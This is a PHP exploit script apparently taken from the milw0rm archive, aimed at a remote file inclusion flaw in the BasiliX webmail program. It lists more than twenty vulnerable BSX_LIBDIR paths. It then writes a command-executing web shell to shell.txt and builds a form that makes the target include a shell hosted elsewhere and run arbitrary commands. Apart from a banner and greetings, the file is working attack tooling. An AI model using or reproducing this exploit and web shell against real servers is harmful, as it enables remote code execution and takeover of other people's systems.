<?php
/*
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
	
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
- BasiliX <= 1.1.1 Remote File Include Exploit
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
- [Script name: BasiliX 1.1.1
- [Script site: http://sourceforge.net/projects/basilix/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
-          Find by: Kacper (a.k.a Rahim)
+
-    DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam
+
-          Contact: kacper1964@yahoo.pl
-                        or
-           http://www.rahim.webd.pl/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
- Special Greetz: DragonHeart ;-)
- Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi, mivus
-                 SkD, nukedclx, Ramzes
-
- Greetz for all users DEVIL TEAM IRC Channel !!
!@ Przyjazni nie da sie zamienic na marne korzysci @!
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
-            Z Dedykacja dla osoby,
-         bez ktorej nie mogl bym zyc...
-           K.C:* J.M (a.k.a Magaja)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/

$cmd = $_POST["cmd"];
$glowna = $_POST["glowna"];
$shell = $_POST["shell"];
$exp= "<title>BasiliX &lt;= 1.1.1 Remote File Include Exploit :: DEVIL TEAM :: The Best Polish Team ::</title>"
."<style type=\"text/css\">"
."body {background-color: #000000;}"
."body,td,th {color: #FFFFFF;}"
."</style><form method=\"post\" action=\"".$glowna.$shell."?cmd=".$cmd."\">"
."<div align=\"center\"><img src=\"http://www.rahim.webd.pl/index_r2_c3.jpg\"></div>"
."<p align=\"center\">script url: (ex. http://www.site.com/[BasiliX_path]/files/abook.php3?BSX_LIBDIR=)<br>"
."<p align=\"center\">or<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/compose-attach.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/compose-menu.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/compose-new.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/compose-send.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/folder-create.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/folder-delete.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/folder-empty.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/folder-rename.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/folders.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/login.php3err=hack&BSX_HTXDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/mbox-action.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/mbox-list.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/message-delete.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/message-forward.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/message-header.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/message-print.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/message-read.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/message-reply.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/message-replyall.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/message-search.php3?BSX_LIBDIR=<br>"
."<p align=\"center\">http://www.site.com/[BasiliX_path]/files/settings.php3?BSX_LIBDIR=<br>"
."<input type=\"text\" name=\"glowna\" size=\"90\"".$glowna."\">"
."<br>"
."shell url: (ex. http://www.site.com/[path]/shell.txt?) shell.txt (CHMOD 777)<br>"
."<input type=\"text\" name=\"shell\" size=\"90\"".$shell."\">"
."<br>"
."cmd: (ex. ls -la)<br>"
."<input name=\"cmd\" type=\"text\" size=\"90\"".$cmd."\">"
."<br>"
."<input type=\"submit\" value=\"Exploit\" name=\"submit\">"
."</p>"
."<p align=\"center\">Find by: <a href=\"mailto:kacper1964@yahoo.pl\">Kacper</a> (a.k.a <a href=\"mailto:kacper1964@yahoo.pl\">Rahim</a>)<br>"
."<br>"
."DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam<br>"
."<br>"
."Contact: <a href=\"mailto:kacper1964@yahoo.pl\">kacper1964@yahoo.pl</a><br>"
."or</p>"
."<p align=\"center\"> <a href=\"http://www.rahim.webd.pl/\">http://www.rahim.webd.pl/</a></p>"
."<p align=\"center\" class=\"name\">&nbsp;</p>"
."<HR WIDTH=\"650\" ALIGN=\"center\">"
."<p align=\"center\"> Z Dedykacja dla osoby,<br>"
."bez ktorej nie mogl bym zyc...<br>"
."K.C:* J.M (a.k.a Magaja)</p>"
."<p align=\"center\">&nbsp;</p>"
."<p align=\"center\"> Special Greetz: DragonHeart ;-)<br>"
."Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi<br>"
."SkD, nukedclx, Ramzes<br>"
."<br>"
."Greetz for all users DEVIL TEAM IRC Channel !!<br>"
."!@ Przyjazni nie da sie zamienic na marne korzysci @!</p>"
."<HR WIDTH=\"650\" ALIGN=\"center\">"
."<p align=\"center\">&nbsp;</p>"
."</form>";

if (!isset($_POST['submit'])) 
{
echo $exp;
}else{
$file = fopen ("shell.txt", "w+");
fwrite($file, '<?php ob_clean();echo"Hacker_Kacper_Made_in_Poland:)";ini_set("max_execution_time",0);passthru($_GET["cmd"]);die;?>');
fclose($file);
$file = fopen ($shell, "r");
if (!$file) {
    echo "<p>Don't Find shell :( Insert in FTP shell.txt.\n";
    exit;
}
echo $exp;
while (!feof ($file)) {
    $line .= fgets ($file, 1024)."<br>";
    }
$tpos1 = strpos($line, "++BEGIN++");
$tpos2 = strpos($line, "++END++");
$tpos1 = $tpos1+strlen("++BEGIN++");
$tpos2 = $tpos2-$tpos1;
$output = substr($line, $tpos1, $tpos2);
}
?>

# milw0rm.com [2006-10-01]